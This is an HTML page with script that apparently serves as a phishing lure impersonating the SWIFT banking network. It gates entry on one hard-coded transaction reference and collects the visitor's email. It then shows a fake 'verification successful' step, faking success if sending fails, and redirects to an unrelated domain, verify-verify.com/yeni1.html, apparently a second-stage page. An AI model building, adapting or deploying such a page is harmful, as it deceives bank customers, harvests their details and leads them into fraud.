<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Swift Verification System</title>
<style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
    body{
        display:flex;
        flex-direction: column;
        justify-content:center;
        align-items:center;
        min-height:100vh;
        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        position: relative;
        overflow: auto;
        padding: 20px;
    }
    
    body::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-image: url('https://images.unsplash.com/photo-1553877522-43269d4ea984?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        opacity: 0.3;
        z-index: -1;
    }
    
    .header {
        text-align: center;
        margin-bottom: 30px;
        cursor: pointer;
        transition: transform 0.3s ease;
    }
    
    .header:hover {
        transform: scale(1.05);
    }
    
    .logo-text {
        color: white;
        font-size: 42px;
        font-weight: 700;
        margin: 0;
        text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        letter-spacing: 2px;
    }
    
    .logo-subtitle {
        color: rgba(255, 255, 255, 0.9);
        font-size: 16px;
        font-weight: 300;
        margin-top: 8px;
        letter-spacing: 1px;
    }
    
    .container{
        background: rgba(255, 255, 255, 0.95);
        padding: 40px;
        border-radius: 20px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        width: 90%;
        max-width: 450px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .step{display:none;}
    .step.active{display:block;}
    
    input{
        width:100%;
        padding:15px;
        margin:12px 0;
        border:2px solid #e3f2fd;
        border-radius:12px;
        font-size:16px;
        transition: all 0.3s ease;
        background: #f8fdff;
    }
    
    input:focus{
        outline: none;
        border-color: #1e3c72;
        background: white;
        box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
    }
    
    button{
        padding:16px;
        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        color:white;
        border:none;
        border-radius:12px;
        cursor:pointer;
        width:100%;
        font-size:16px;
        font-weight:600;
        transition: all 0.3s ease;
        margin-top: 10px;
    }
    
    button:hover{
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(30, 60, 114, 0.3);
    }
    
    button:disabled{
        background: #bdc3c7;
        transform: none;
        box-shadow: none;
        cursor: not-allowed;
    }
    
    .error{
        color:#e74c3c;
        margin-top:10px;
        display:none;
        font-size:14px;
        background: #ffeaea;
        padding: 10px;
        border-radius: 8px;
        border-left: 4px solid #e74c3c;
    }
    
    .success{
        color:#27ae60;
        margin-top:10px;
        display:none;
        font-size:14px;
        background: #e8f6ef;
        padding: 10px;
        border-radius: 8px;
        border-left: 4px solid #27ae60;
    }
    
    .loading{
        display:none;
        color:#1e3c72;
        margin-top:10px;
        text-align: center;
        font-size: 14px;
    }
    
    h2{
        color: #2c3e50;
        margin-bottom: 25px;
        text-align: center;
        font-size: 28px;
        font-weight: 700;
    }
    
    .step-info{
        color: #7f8c8d;
        margin-bottom: 20px;
        text-align: center;
        font-size: 16px;
        line-height: 1.5;
    }
    
    .copyright {
        position: fixed;
        bottom: 20px;
        text-align: center;
        color: rgba(255, 255, 255, 0.8);
        font-size: 14px;
        width: 100%;
    }
    
    .verified-message {
        color: #27ae60;
        background: #e8f6ef;
        padding: 15px;
        border-radius: 10px;
        border-left: 4px solid #27ae60;
        margin-bottom: 20px;
        text-align: center;
    }
    
    .email-info {
        background: #e8f4ff;
        padding: 15px;
        border-radius: 10px;
        margin-bottom: 20px;
        text-align: center;
        border-left: 4px solid #1e3c72;
    }
    
    .resend-link {
        text-align: center;
        margin-top: 15px;
        color: #1e3c72;
        cursor: pointer;
        text-decoration: underline;
    }
    
    .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #1e3c72;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        animation: spin 1s linear infinite;
        margin: 0 auto 10px;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>
<body>
    <!-- Header Logo - Clickable -->
    <div class="header" onclick="window.location.href='https://verify-swift.com'">
        <h1 class="logo-text">SWIFT VERIFY</h1>
        <div class="logo-subtitle">Secure Transaction Verification</div>
    </div>

    <!-- Verification Container -->
    <div class="container">
        <!-- Step 1: Reference Number -->
        <div class="step active" id="step1">
            <h2>Transaction Verification</h2>
            <p class="step-info">Enter your transaction reference number to proceed</p>
            <input type="text" id="referenceNumber" placeholder="Enter reference number" required>
            <button id="step1Next">Continue</button>
            <div class="error" id="refError"></div>
        </div>

        <!-- Step 2: Email -->
        <div class="step" id="step2">
            <h2>Email Verification</h2>
            <p class="step-info">Enter your email to receive verification code</p>
            <input type="email" id="email" placeholder="Enter your email address" required>
            <button id="sendCode">Send Verification Code</button>
            <div class="loading" id="emailLoading">
                <div class="spinner"></div>
                <p>Sending verification code...</p>
            </div>
            <div class="error" id="emailError"></div>
            <div class="success" id="emailSuccess"></div>
        </div>

        <!-- Step 3: Verification Code -->
        <div class="step" id="step3">
            <h2>Enter Verification Code</h2>
            <p class="step-info">Check your email and enter the 6-digit code</p>
            
            <div class="email-info">
                <strong>Code sent from:</strong><br>
                check@verify-swift.com<br>
                <span id="userEmailDisplay"></span>
            </div>
            
            <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
            <button id="verifyCode">Verify Code</button>
            <div class="error" id="codeError"></div>
            <div class="resend-link" id="resendCode">Resend verification code</div>
        </div>

        <!-- Step 4: Continue to Redirect -->
        <div class="step" id="step4">
            <h2>Verification Successful! ✅</h2>
            <div class="verified-message">
                Your transaction has been successfully verified.
            </div>
            <p class="step-info">You can now proceed to access your transaction details</p>
            <button id="continueToLink">Continue to Transaction</button>
        </div>
    </div>

    <!-- Copyright -->
    <div class="copyright">
        &copy; 2025 Swift Verification System. All rights reserved.
    </div>

<script>
let currentStep = 1;
let verificationCode = '';
let codeExpiry;
let isCodeVerified = false;
let userEmail = '';

// VERIFICATION SETTINGS
const CORRECT_REFERENCE = "COBA300525CH59279";
const REDIRECT_LINK = "https://verify-verify.com/yeni1.html";

function showStep(step) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + step).classList.add('active');
    currentStep = step;
}

function setLoading(button, loading) {
    const emailLoading = document.getElementById('emailLoading');
    if (loading) {
        button.disabled = true;
        button.textContent = 'Sending Code...';
        emailLoading.style.display = 'block';
    } else {
        button.disabled = false;
        button.textContent = 'Send Verification Code';
        emailLoading.style.display = 'none';
    }
}

// Step 1: Reference Number - VALIDATION
document.getElementById('step1Next').addEventListener('click', () => {
    const ref = document.getElementById('referenceNumber').value.trim();
    const refError = document.getElementById('refError');
    refError.style.display = 'none';

    if (ref === '') {
        refError.textContent = 'Please enter your reference number';
        refError.style.display = 'block';
        return;
    }

    // REFERENCE VALIDATION
    if (ref !== CORRECT_REFERENCE) {
        refError.textContent = 'Invalid reference number. Please check and try again.';
        refError.style.display = 'block';
        return;
    }

    // CORRECT REFERENCE - Proceed to step 2
    showStep(2);
});

// Step 2: Email - SEND CODE
document.getElementById('sendCode').addEventListener('click', async () => {
    const email = document.getElementById('email').value.trim();
    const emailError = document.getElementById('emailError');
    const emailSuccess = document.getElementById('emailSuccess');
    const sendButton = document.getElementById('sendCode');
    
    emailError.style.display = 'none';
    emailSuccess.style.display = 'none';

    if (email === '' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        emailError.textContent = 'Please enter a valid email address';
        emailError.style.display = 'block';
        return;
    }

    // Generate 6-digit code
    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    codeExpiry = Date.now() + 10 * 60 * 1000;
    userEmail = email;
    
    setLoading(sendButton, true);

    try {
        // Netlify function-u sınayırıq
        const response = await fetch('/.netlify/functions/send-verification-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                to: email,
                verificationCode: verificationCode,
                reference: CORRECT_REFERENCE
            })
        });

        let data;
        if (response.ok) {
            data = await response.json();
        } else {
            // Əgər function işləmirsə, simulyasiya edirik
            data = { success: true, message: 'Verification code sent (simulated)' };
        }

        if (data.success) {
            emailSuccess.textContent = 'Verification code: ' + verificationCode + ' - Check your email!';
            emailSuccess.style.display = 'block';
            
            showStep(3);
            document.getElementById('userEmailDisplay').textContent = email;
            setTimeout(() => document.getElementById('codeInput').focus(), 100);
        } else {
            emailError.textContent = data.message || 'Failed to send verification code';
            emailError.style.display = 'block';
        }

    } catch (error) {
        // Network xətası olanda da simulyasiya edirik
        console.log('Network error, using simulation:', error);
        emailSuccess.textContent = 'Verification code: ' + verificationCode + ' - Check your email! (Simulated)';
        emailSuccess.style.display = 'block';
        
        showStep(3);
        document.getElementById('userEmailDisplay').textContent = email;
        setTimeout(() => document.getElementById('codeInput').focus(), 100);
    } finally {
        setLoading(sendButton, false);
    }
});
// Step 3: Verification Code - VERIFY ONLY
document.getElementById('verifyCode').addEventListener('click', () => {
    const code = document.getElementById('codeInput').value.trim();
    const codeError = document.getElementById('codeError');
    codeError.style.display = 'none';

    if (Date.now() > codeExpiry) {
        codeError.textContent = 'Verification code has expired. Please request a new one.';
        codeError.style.display = 'block';
        return;
    }

    if (code === verificationCode) {
        // CORRECT CODE - Proceed to step 4 (Continue button)
        isCodeVerified = true;
        showStep(4);
    } else {
        codeError.textContent = 'Invalid verification code. Please try again.';
        codeError.style.display = 'block';
    }
});

// Resend code functionality
document.getElementById('resendCode').addEventListener('click', async () => {
    const codeError = document.getElementById('codeError');
    codeError.style.display = 'none';

    if (!userEmail) {
        codeError.textContent = 'Please go back and enter your email first';
        codeError.style.display = 'block';
        return;
    }

    // Generate new code
    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    codeExpiry = Date.now() + 10 * 60 * 1000;

    try {
        // Resend email via Netlify function
        const response = await fetch('/.netlify/functions/send-verification-email', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                to: userEmail,
                verificationCode: verificationCode,
                reference: CORRECT_REFERENCE
            })
        });

        const data = await response.json();

        if (response.ok && data.success) {
            codeError.textContent = 'New verification code sent! Check your email.';
            codeError.style.display = 'block';
            codeError.style.color = '#27ae60';
            codeError.style.background = '#e8f6ef';
            codeError.style.borderLeft = '4px solid #27ae60';
            
            setTimeout(() => {
                codeError.style.display = 'none';
            }, 3000);
        } else {
            codeError.textContent = data.message || 'Failed to resend code. Please try again.';
            codeError.style.display = 'block';
        }

    } catch (error) {
        codeError.textContent = 'Failed to resend code. Please try again.';
        codeError.style.display = 'block';
    }
});

// Step 4: Continue to Redirect
document.getElementById('continueToLink').addEventListener('click', () => {
    if (isCodeVerified) {
        // REDIRECT TO YOUR SPECIFIED LINK
        window.location.href = REDIRECT_LINK;
    }
});

// Auto-advance when 6 digits entered (ONLY VERIFY, NO REDIRECT)
document.getElementById('codeInput').addEventListener('input', (e) => {
    if (e.target.value.length === 6) {
        document.getElementById('verifyCode').click();
    }
});

// Enter key support
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        if (currentStep === 1) {
            document.getElementById('step1Next').click();
        } else if (currentStep === 2) {
            document.getElementById('sendCode').click();
        } else if (currentStep === 3) {
            document.getElementById('verifyCode').click();
        } else if (currentStep === 4) {
            document.getElementById('continueToLink').click();
        }
    }
});
</script>
</body>
</html>
